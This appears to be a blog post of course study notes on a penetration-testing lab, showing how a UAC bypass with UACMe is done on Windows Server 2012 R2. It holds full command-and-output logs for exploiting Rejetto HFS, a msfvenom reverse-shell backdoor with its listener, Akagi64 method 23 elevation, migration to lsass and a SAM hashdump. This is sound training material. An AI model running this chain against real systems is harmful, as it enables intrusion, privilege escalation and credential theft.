---
layout: post
title: "Bypassing UAC With UACMe"
date: "2022-09-28"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Bypassing UAC With UACMe（使用 UACMe 绕过 UAC）
## UAC（用户帐户控制）
用户帐户控制 (UAC) 是 Windows Vista 中引入的一项 Windows 安全功能，用于防止对操作系统进行未经授权的更改。

UAC 用于确保对操作系统的更改需要管理员或属于本地管理员组的用户帐户的批准。

尝试使用提升权限执行程序的非特权用户将收到 UAC 凭据提示，而特权用户将收到同意提示。

攻击可以绕过 UAC 以执行具有提升权限的恶意可执行文件。

## 绕过 UAC
为了成功绕过 UAC，我们需要访问属于 Windows 目标系统上本地管理员组的用户帐户。

If we are part of the local administrators group, that means we have the ability to execute programs or certain commands with administrative privileges, the only problem is that we need to bypass that consent dialog box. We can't bypass UAC if we don't have access to an accout that is part of the local administrator group. The local administrator group on Windows is a group that used to assigned administrative privileges to user accounts and the difference be able to use it when we are performing tasks that require administrative privigles, like installing new software, etc.

UAC 允许以管理权限执行程序，从而提示用户进行确认。

UAC 具有从低到高的各种完整性级别，如果将 UAC 保护级别设置为低于高，则可以在不提示用户信息的情况下以提升的权限执行 Windows 程序。

A typical use case: if we create a meterpreter payload with msfvenom, and upload it to the target and if we want to execute it with administrative privileges, we can bypass UAC and get that payload executed with adminisrative privileges without having to go through the consent process. Once that payload is executed, because it's been executed with administrative privileges, we will obtain an elevated meterpreter session which means successfully being able to elevated our privileges.

有多种工具和技术可用于绕过 UAC，但是，使用的工具和技术将取决于目标系统上运行的 Windows 版本。

## 使用 UACMe 绕过 UAC
UACMe 是由@hfirefox 开发的开源、强大的权限提升工具。 它可用于通过利用各种技术绕过 Windows UAC。

Github：https://github.com/hfiref0x/UACME

UACME GitHub 存储库包含一个非常有据可查的方法列表，这些方法可用于在从 Windows 7 到 Windows 10 的多个版本的 Windows 上绕过 UAC。

它允许攻击者通过滥用内置的 Windows AutoElevate 工具在具有管理/提升权限的 Windows 目标上执行恶意负载。

UACMe GitHub 存储库有 60 多个可用于绕过 UAC 的漏洞，具体取决于目标上运行的 Windows 版本。

# Demo: Bypassing UAC With UACMe

I used a user account that is a part of the local adminisrator group on Windows.

I open up a Command Prompt here.

`右键点击上边栏->Properties->Font->Size->20`

```
C:\Users\IEUser>net users
C:\Users\IEUser>net localgroup administrators
```

UAC Security level: `Starup Menu->Change User Account Control settings`

How we can bypass UAC through the access within standard command shell or meterpreter session:

```
Target IP Address: 10.2.22.220
```

First step, identify a vulerablity or vulnerable service running on the target that we can exploit to get initial access.

```
nmap 10.2.22.220
```

访问：

```
http://10.2.22.220
```

```
service postgresql start && msfconsole

setg RHOSTS 10.2.22.220
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
exploit
```

Perform some basic local enumeration to identify what version of Windows is running, what current user we have access to, what privileges this user has.

The current meterpreter session is a 32 bit session, so I can migrate to the explore process, so I can search for the explore process by using `pgrep`, search for the process id for the explorer.exe. Migrate to 2448, that provide me with a 64 bit meterpreter session. We currentlt logged on as admin users. Get current user privileges.

```
meterpreter> sysinfo
OS  :   Windows 2012 R2 (6.3 Build 9600)
Meterpreter :   x86/windows
meterpreter> pgrep explorer
2448
meterpreter> migrate 2448
meterpreter> sysinfo
Meterpreter : x64/windows
meterpreter> getuid
Server username: VICTIM\admin
meterpreter> getprivs
```

To verify this user is a part of local administrator group: The admin user is a part of administrator group, which means this user can execute programs with elevated privileges. But in order to do that, we need to bypass UAC.



```
meterpreter> shell
C:\Windows\system32>net user
User accounts for \\VICTIM
--------------------------------------------------------------------------------
admin       Administrator   Guest
C:\Windows\system32>net localgroup administrators
Members
--------------------------------------------------------------------------------
admin
Administrator
```

The activity of changing password of a user require me to accepect when the UAC consent form or the dialog box was prompted up. And through the command shell that cannot be done unless we bypass UAC.

```
C:\Windows\system32>net user admin password123
System error 5 has occurred.

Access is denied.
```

[UACME](https://github.com/hfiref0x/UACME)

[source code](https://github.com/hfiref0x/UACME/tree/master/Source/Akagi/bin)

`Source->Akagi->bin`

```
C:\Windows\system32>^C
Terminate channel 1? [y/N] y
meterpreter>
```

Generate a meterpreter payload with msfvenom:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
```

Set up listener with msfconsole. Set up the multi handler to receive the connection once the payload is executed on the target. So, we have a reverse TCP handler listening on port 1234, ready to receive the connection from the meterpreter payload that we generated.

```
msfconsole

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
```

If we want to execute backdoor.exe with administrative privileges, we will not able to do it because UAC will prevent us from doing that. In order to bypass UAC on this particular version of Windows, we will be using method 23 or key 23 rather, which takes advantage of package manager on Windows.

```
meterpreter > pwd
C:\Windows\system32
meterpreter > getprivs
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload backdoor.exe
meterpreter > upload /root/Desktop/tools/UACMe/Akagi64.exe
meterpreter > shell
C:\Temp>dir
```

This would bypass UAC and backdoor.exe should be executed with elevated privileges or administrative privileges, and because it is a meterpreter payload, we should receive the elevated meterpreter session on our listener.

```
C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

If we list out the process tree here, we can migrate to any other process here that have `NT AUTHORITY\SYSTEM` privileges. Because we are privileged, we can migrate to any of the services. For example, I can migrate to lsass.exe service here, that currently has `NT AUTHORITY\SYSTEM` privilege. 

```
Sending stage
Meterpreter session 1 opened

meterpreter > sysinfo
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs
meterpreter > ps
```

Migrate to 688, that provides us with 64 bit meterpreter session. We successfullt been able to elevated our privileges by bypassing UAC. In this case by bypassing UAC on Windows 2012 R2.

```
meterpreter > migrate 688
meterpreter > sysinfo
Meterpreter :   x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Recommanded:

```
33. Author: winscripting.blog
Type: Shell API
Method: Registry key manipulation
Target(s): \system32\fodhelper.exe
Component(s): Attacker defined
Implementation: ucmShellRegModMethod
Works from: Windows 10 TH1 (10240)
Fixed in: unfixed 🙈
How: -
Code status: added in v2.7.2
```

# UAC 绕过：UACMe
## 概述
Kali GUI 机器和运行易受攻击服务器的目标机器提供给您。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。

你的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用应用程序。

然后， 使用UACME 工具 绕过UAC 。

UACME：
* 击败 Windows 用户帐户控制 (UAC) 并获得管理员权限。
* 它滥用内置的 Windows AutoElevate 可执行文件。
* 它有超过 65 种方法可供用户用来绕过 UAC，具体取决于 Windows 操作系统版本。
* 由 https://twitter.com/hFireF0X 开发
* 主要用 C 编写，部分代码用 C++ 编写

目标：在受感染机器上获得最高权限并获取管理员用户 NTLM 哈希。

指示：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”以了解 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## 我自己的思路

```
Target IP Address : 10.0.28.179
```

```
root@attackdefense:~# nmap 10.0.28.179
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-28 15:14 IST
Nmap scan report for 10.0.28.179
Host is up (0.0031s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
```

```
root@attackdefense:~# nmap -p 80 -sV 10.0.28.179
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-28 15:17 IST
Nmap scan report for 10.0.28.179
Host is up (0.0033s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds

```

```
http://10.0.28.179/
```

[Rejetto HttpFileServer Remote Command Execution](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)

Rejetto HttpFileServer 远程命令执行

由于文件 ParserLib.pas 中的正则表达式不佳，Rejetto HttpFileServer (HFS) 容易受到远程命令执行攻击。此模块通过使用“%00”绕过过滤来利用 HFS 脚本命令。此模块已在 Windows XP SP3、Windows 7 SP1 和 Windows 8 上的 HFS 2.3b 上成功测试。

```
root@attackdefense:~# service postgresql start && msfconsole
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.21.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.0.28.179
RHOSTS => 10.0.28.179
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.2:4444 
[*] Using URL: http://0.0.0.0:8080/6ZFwgw
[*] Local IP: http://10.10.21.2:8080/6ZFwgw
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /6ZFwgw
[*] Sending stage (175174 bytes) to 10.0.28.179
[*] Meterpreter session 1 opened (10.10.21.2:4444 -> 10.0.28.179:49263) at 2022-09-28 15:26:27 +0530
[!] Tried to delete %TEMP%\vFLEE.vbs, unknown result
[*] Server stopped.

meterpreter > 

```

当前用户是admin。

```
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pgrep explore
2712
meterpreter > migrate 2712
[*] Migrating from 1996 to 2712...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```

由于需要管理员在UAC提示消息中进行确认，更改用户admin密码的操作访问被拒绝。admin账户在本地组administrators中，可以利用它bypass UAC。

```
meterpreter > shell
Process 2496 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.


C:\Windows\system32>net user admin password123
net user admin password123
System error 5 has occurred.

Access is denied.

```

首先，使用msfvenom生成后门，利用metasploit multi handler监听该后门。将后门和bypass UAC提权工具Akagai上传到目标主机，在目标主机上利用Akagai执行后门，就可以绕过UAC，以特权运行后门，从而获得有管理员权限的meterpreter session。

```
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.21.2 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
root@attackdefense:~# ls
Desktop  backdoor.exe  thinclient_drives
root@attackdefense:~# pwd
/root

```

```
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.21.2
LHOST => 10.10.21.2
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.21.2:1234 


```

在目标的C:\创建Temp目录，并且将akagai和后门上传到Temp目录。

```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\\
meterpreter > pwd
C:\
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > upload /root/backdoor.exe
[*] uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] uploaded   : /root/backdoor.exe -> backdoor.exe
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe

```

利用Akagi64.exe key 23执行backdoor.exe，可以绕过UAC，获得管理员权限的meterpreter session。

```
C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe

```

执行上述命令后，在multi handler获得了meterpreter session。

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.21.2:1234 
[*] Sending stage (175174 bytes) to 10.0.28.179
[*] Meterpreter session 1 opened (10.10.21.2:1234 -> 10.0.28.179:49425) at 2022-09-28 16:05:04 +0530
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 352   680   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 368   4     smss.exe              x64   0                                      
 512   680   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 520   512   csrss.exe             x64   0                                      
 588   512   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 596   580   csrss.exe             x64   1                                      
 640   580   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 680   588   services.exe          x64   0                                      
 688   588   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 748   680   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 780   680   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 876   640   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 884   680   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 912   680   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 940   680   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 960   680   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1124  680   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1152  680   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1180  680   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1244  680   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1264  680   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1328  680   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1384  680   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1628  2224  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 1684  748   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1892  2368  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 2148  1276  backdoor.exe          x86   1        VICTIM\admin                  C:\Temp\backdoor.exe
 2224  2628  cmd.exe               x86   1        VICTIM\admin                  C:\Windows\SysWOW64\cmd.exe
 2240  2808  hfs.exe               x86   1        VICTIM\admin                  C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 2320  748   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2368  2808  cmd.exe               x64   1        VICTIM\admin                  C:\Windows\System32\cmd.exe
 2748  912   taskhostex.exe        x64   1        VICTIM\admin                  C:\Windows\System32\taskhostex.exe
 2808  2800  explorer.exe          x64   1        VICTIM\admin                  C:\Windows\explorer.exe
 2824  680   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe

```

```
meterpreter > migrate 688
[*] Migrating from 2148 to 688...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRelabelPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeTrustedCredManAccessPrivilege
SeUndockPrivilege

```

The hashdump post module will dump the contents of the SAM database.

```
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Admin NTLM Hash: `4d6583ed4cef81c2f2ac3c88fc5f3da6`。


## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2208.pdf

[Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution](https://www.exploit-db.com/exploits/39161)

[Rejetto HttpFileServer Remote Command Execution](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)

[UACME](https://github.com/hfiref0x/UACME)


